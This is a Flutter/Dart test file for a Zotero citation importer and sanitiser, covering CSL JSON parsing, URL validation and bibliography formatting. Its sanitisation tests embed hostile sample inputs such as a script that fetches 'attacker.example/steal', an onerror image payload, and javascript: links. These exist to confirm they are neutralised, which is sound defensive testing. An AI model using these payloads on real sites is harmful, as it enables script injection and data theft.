import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:quds_office_editor/src/embed/word_zotero_format.dart';
import 'package:quds_office_engine/quds_office_engine.dart';

Map<String, dynamic> _source({
  Object id = 'offline-1',
  String title = 'Research in القدس',
  String family = 'Hassan',
  String given = 'Amal',
  int year = 2024,
}) => {
  'id': id,
  'type': 'article-journal',
  'title': title,
  'author': [
    {'family': family, 'given': given},
  ],
  'issued': {
    'date-parts': [
      [year, 3, 6],
    ],
  },
};

ZoteroCitationItem _citation({
  String id = 'offline-1',
  String? uri,
  String title = 'Research in القدس',
  String family = 'Hassan',
  String given = 'Amal',
  int year = 2024,
  String? locator,
  String? label,
  String? prefix,
  String? suffix,
  bool suppressAuthor = false,
  bool authorOnly = false,
}) => ZoteroCitationItem.fromJson({
  'id': id,
  'uris': [?uri],
  'itemData': _source(
    id: id,
    title: title,
    family: family,
    given: given,
    year: year,
  ),
  'locator': ?locator,
  'label': ?label,
  'prefix': ?prefix,
  'suffix': ?suffix,
  if (suppressAuthor) 'suppress-author': true,
  if (authorOnly) 'author-only': true,
});

void main() {
  group('CSL JSON import', () {
    test(
      'accepts single object, normal array and Zotero Web API v3 envelope',
      () {
        final source = _source(id: '392648/ABCD1234');
        for (final input in [
          source,
          [source],
          {
            'items': [source],
          },
        ]) {
          final result = zoteroImportCslJson(jsonEncode(input));
          expect(result, hasLength(1));
          expect(result.single.itemData!['title'], 'Research in القدس');
          expect(result.single.itemData!['author'], source['author']);
          // The export's internal library ID is not a Zotero user ID.
          expect(result.single.uris, isEmpty);
          expect(result.single.id, '392648/ABCD1234');
        }
      },
    );

    test('creates distinct offline IDs for records with no ID or URI', () {
      final source = {..._source()}..remove('id');
      final records = zoteroImportCslJson(jsonEncode([source, source]));
      expect(records.map((item) => item.id).toSet(), hasLength(2));
      expect(records.every((item) => item.uris.isEmpty), isTrue);
      expect(records.every((item) => item.itemData!['id'] == item.id), isTrue);
    });

    test('links explicit personal and group URIs without conflating identical keys', () {
      final sources = [
        {..._source(), 'uri': 'http://zotero.org/users/123/items/ABCD1234'},
        {
          ..._source(),
          'uris': ['https://zotero.org/groups/123/items/ABCD1234'],
        },
      ];
      final result = zoteroImportCslJson(jsonEncode(sources));
      expect(result.first.uris, ['http://zotero.org/users/123/items/ABCD1234']);
      expect(result.last.uris, [
        'https://zotero.org/groups/123/items/ABCD1234',
      ]);
      expect(result.first.id, isNot(result.last.id));
      final user = ZoteroSourceAddress.parse(result.first.uris.single)!;
      final group = ZoteroSourceAddress.parse(result.last.uris.single)!;
      expect(user.library.type, ZoteroLibraryType.user);
      expect(group.library.type, ZoteroLibraryType.group);
      expect(user.library.id, 123);
      expect(group.key, 'ABCD1234');
    });

    test('a canonical URI in the CSL id is a linked source', () {
      const uri = 'https://www.zotero.org/users/42/items/EFGH5678';
      final item = zoteroImportCslJson(jsonEncode(_source(id: uri))).single;
      expect(item.uris, [uri]);
      expect(item.itemData!['id'], uri);
    });

    test('preserves unsynced desktop identities without Web API routing', () {
      const uri = 'http://zotero.org/users/local/LOCALKEY/items/ABCD1234';
      final item = zoteroImportCslJson(jsonEncode(_source(id: uri))).single;
      expect(item.uris, [uri]);
      expect(item.id, uri);
      expect(item.itemData!['id'], uri);
      expect(ZoteroSourceAddress.isLocalItemUri(uri), isTrue);
      expect(ZoteroSourceAddress.parse(uri), isNull);
    });

    test('rejects local routing aliases and malformed desktop identities', () {
      for (final uri in [
        'http://zotero.org/users/0/items/ABCD1234',
        'http://zotero.org/users/local/LOCALKEY/items/ABCD1234?key=secret',
        'http://zotero.org/users/local/LOCALKEY/items/ABCD1234#fragment',
        'http://secret@zotero.org/users/local/LOCALKEY/items/ABCD1234',
        'http://zotero.org:23119/users/local/LOCALKEY/items/ABCD1234',
        'http://zotero.org/users/local/too-short/items/ABCD1234',
        'http://zotero.org/users/local/LOCALKEY/items/not-a-key',
        'http://localhost:23119/api/users/0/items/ABCD1234',
      ]) {
        expect(ZoteroSourceAddress.isLocalItemUri(uri), isFalse, reason: uri);
        final item = zoteroImportCslJson(jsonEncode(_source(id: uri))).single;
        expect(item.uris, isEmpty, reason: uri);
      }
    });

    test('untrusted and noncanonical URLs remain offline sources', () {
      for (final uri in [
        'https://attacker.example/users/42/items/ABCD1234',
        'https://zotero.org.attacker.example/users/42/items/ABCD1234',
        'http://localhost:23119/api/users/0/items/ABCD1234',
        'https://api.zotero.org/users/42/items/ABCD1234',
        'https://zotero.org/users/42/items/ABCD1234?key=secret',
        'javascript:alert(1)',
      ]) {
        final source = {..._source(id: uri), 'uri': uri};
        final item = zoteroImportCslJson(jsonEncode(source)).single;
        expect(item.uris, isEmpty, reason: uri);
        expect(ZoteroSourceAddress.parse(uri), isNull, reason: uri);
      }
    });

    test('accepts exactly 500 records and refuses 501 or an empty export', () {
      final records = List.generate(500, (index) => _source(id: index));
      expect(zoteroImportCslJson(jsonEncode(records)), hasLength(500));
      expect(
        () => zoteroImportCslJson(jsonEncode([...records, _source()])),
        throwsFormatException,
      );
      expect(() => zoteroImportCslJson('[]'), throwsFormatException);
      expect(() => zoteroImportCslJson('{"items":[]}'), throwsFormatException);
    });

    test('the import size bound counts UTF-8 bytes, not characters', () {
      final input = jsonEncode(_source(title: 'é' * (512 * 1024)));
      expect(input.length, lessThan(1024 * 1024));
      expect(utf8.encode(input).length, greaterThan(1024 * 1024));
      expect(() => zoteroImportCslJson(input), throwsFormatException);
    });

    test('refuses malformed JSON and incomplete or wrongly typed records', () {
      for (final input in [
        '{bad json',
        'null',
        '"a title"',
        '[null]',
        '{}',
        '{"title":"Missing type"}',
        '{"type":"book","title":23}',
        '{"type":true,"title":"Bad type"}',
        '{"items":"not a list"}',
        '{"type":"book","title":"Bad id","id":{}}',
      ]) {
        expect(
          () => zoteroImportCslJson(input),
          throwsFormatException,
          reason: input,
        );
      }
    });
  });

  group('refreshable source addresses', () {
    test('recognizes personal/group HTTP and HTTPS item identifiers', () {
      for (final url in [
        'http://zotero.org/users/12/items/ABCD1234',
        'https://zotero.org/users/12/items/ABCD1234',
        'https://www.zotero.org/groups/12/items/ABCD1234',
      ]) {
        final address = ZoteroSourceAddress.parse(url);
        expect(address, isNotNull, reason: url);
        expect(address!.library.id, 12);
        expect(address.key, 'ABCD1234');
      }
    });

    test(
      'refuses credentials, query strings, fragments, ports and invalid keys',
      () {
        for (final url in [
          'https://secret@zotero.org/users/12/items/ABCD1234',
          'https://zotero.org:8443/users/12/items/ABCD1234',
          'https://zotero.org/users/12/items/ABCD1234?foo=bar',
          'https://zotero.org/users/12/items/ABCD1234#section',
          'https://zotero.org/users/0/items/ABCD1234',
          'https://zotero.org/groups/-12/items/ABCD1234',
          'https://zotero.org/users/name/items/ABCD1234',
          'https://zotero.org/users/12/items/abcdefgh',
          'https://zotero.org/users/12/items/ABCD123',
          'https://zotero.org/users/12/items/ABCD1234/extra',
        ]) {
          expect(ZoteroSourceAddress.parse(url), isNull, reason: url);
        }
      },
    );
  });

  group('formatted references become inert text', () {
    test('removes scripts, styles and resource tags while preserving reference text', () {
      final text = zoteroHtmlToPlainText(
        '<style>body { background:url(https://attacker.example/image); }</style>'
        '<ScRiPt>fetch("https://attacker.example/steal")</sCrIpT>'
        '<div><img src="https://attacker.example/image" onerror="alert(1)">'
        '<a href="javascript:alert(1)">A useful source</a></div>'
        '<p>Second <i>reference</i><br />next line</p>',
      );
      expect(text, 'A useful source\nSecond reference\nnext line');
      expect(text, isNot(contains('attacker.example')));
      expect(text, isNot(contains('alert')));
    });

    test(
      'decodes named and numeric entities and preserves multilingual text',
      () {
        expect(
          zoteroHtmlToPlainText(
            'القدس&nbsp;&amp; 東京 &lt;em&gt; &quot;A&quot; &apos;B&apos; '
            '&ndash; &mdash; &lsquo;C&rsquo; &ldquo;D&rdquo; &#233; &#x1F600;',
          ),
          'القدس & 東京 <em> "A" \'B\' – — ‘C’ “D” é 😀',
        );
      },
    );

    test(
      'decoded markup is returned as text and never recursively evaluated',
      () {
        expect(
          zoteroHtmlToPlainText(
            '&lt;script&gt;alert(1)&lt;/script&gt; &amp;lt;b&amp;gt;',
          ),
          '<script>alert(1)</script> &lt;b&gt;',
        );
      },
    );

    test(
      'invalid Unicode numeric references produce replacement characters',
      () {
        expect(zoteroHtmlToPlainText('&#0; &#xD800; &#x110000;'), '� � �');
      },
    );

    test('recognizes uppercase variants of supported HTML entities', () {
      expect(zoteroHtmlToPlainText('&AMP; &LT; &GT; &QUOT;'), '& < > "');
    });

    test('oversized formatted responses are refused', () {
      expect(
        () => zoteroHtmlToPlainText('x' * (8 * 1024 * 1024 + 1)),
        throwsFormatException,
      );
    });
  });

  group('basic citation fallback', () {
    test('formats locators and affixes without claiming a CSL style', () {
      final citation = _citation(
        locator: '21–23',
        prefix: 'see',
        suffix: 'for context',
      );
      expect(
        zoteroBasicCitation([citation]),
        '(see Hassan, 2024, p. 21–23 for context)',
      );
      expect(
        zoteroBasicCitation([_citation(locator: '3', label: 'chapter')]),
        '(Hassan, 2024, chap. 3)',
      );
    });

    test(
      'suppress-author leaves the year and locator, with affixes retained',
      () {
        expect(
          zoteroBasicCitation([
            _citation(
              suppressAuthor: true,
              locator: '2',
              label: 'section',
              prefix: 'see',
            ),
          ]),
          '(see 2024, sec. 2)',
        );
      },
    );

    test('author-only omits the year and multiple items remain separated', () {
      expect(zoteroBasicCitation([_citation(authorOnly: true)]), '(Hassan)');
      expect(
        zoteroBasicCitation([
          _citation(),
          _citation(id: 'other', family: 'Ali', year: 2020),
        ]),
        '(Hassan, 2024; Ali, 2020)',
      );
    });

    test('corporate authors, missing authors and missing dates have readable fallbacks', () {
      final corporate = ZoteroCitationItem.fromJson({
        'id': 'corporate',
        'itemData': {
          'type': 'report',
          'title': 'A report',
          'author': [
            {'literal': 'Research Council'},
          ],
          'issued': {'literal': 'Spring 2022'},
        },
      });
      final anonymous = ZoteroCitationItem.fromJson({
        'id': 'anonymous',
        'itemData': {'type': 'book', 'title': '<i>Anonymous work</i>'},
      });
      expect(zoteroBasicCitation([corporate]), '(Research Council, 2022)');
      expect(zoteroBasicCitation([anonymous]), '(Anonymous work, n.d.)');
    });
  });

  group('basic bibliography fallback', () {
    test('deduplicates repeated citations and sorts authors then titles', () {
      final late = _citation(id: 'late', family: 'Zulu', title: 'Last source');
      final early = _citation(
        id: 'early',
        family: 'Ali',
        title: 'First source',
      );
      final next = _citation(id: 'next', family: 'Ali', title: 'Second source');
      final text = zoteroBasicBibliography([late, next, early, early, late]);
      expect(text.split('\n\n'), [
        'Ali, Amal (2024). First source.',
        'Ali, Amal (2024). Second source.',
        'Zulu, Amal (2024). Last source.',
      ]);
    });

    test(
      'linked sources dedupe by URI while distinct libraries remain distinct',
      () {
        final user = _citation(
          id: 'one',
          uri: 'http://zotero.org/users/12/items/ABCD1234',
          title: 'Personal copy',
        );
        final sameUser = _citation(
          id: 'different local id',
          uri: 'http://zotero.org/users/12/items/ABCD1234',
          title: 'Duplicate',
        );
        final group = _citation(
          id: 'one',
          uri: 'http://zotero.org/groups/12/items/ABCD1234',
          title: 'Group copy',
        );
        final text = zoteroBasicBibliography([user, sameUser, group]);
        expect(text.split('\n\n'), hasLength(2));
        expect(text, contains('Personal copy'));
        expect(text, contains('Group copy'));
        expect(text, isNot(contains('Duplicate')));
      },
    );

    test('canonical URL aliases identify the same bibliography source', () {
      final sources = [
        _citation(
          id: 'first',
          uri: 'http://zotero.org/users/12/items/ABCD1234',
        ),
        _citation(
          id: 'second',
          uri: 'https://zotero.org/users/12/items/ABCD1234',
        ),
        _citation(
          id: 'third',
          uri: 'https://www.zotero.org/users/12/items/ABCD1234',
        ),
      ];
      expect(zoteroBasicBibliography(sources).split('\n\n'), hasLength(1));
    });

    test('keeps container/DOI data, strips title markup and skips missing snapshots', () {
      final source = ZoteroCitationItem.fromJson({
        'id': 'enriched',
        'itemData': {
          ..._source(title: '<i>A</i> &amp; <b>B</b>'),
          'container-title': 'Journal of Examples',
          'DOI': '10.1234/example',
        },
      });
      final missing = ZoteroCitationItem.fromJson({'id': 'no-data'});
      final text = zoteroBasicBibliography([missing, source]);
      expect(
        text,
        'Hassan, Amal (2024). A & B. Journal of Examples. https://doi.org/10.1234/example',
      );
    });
  });
}
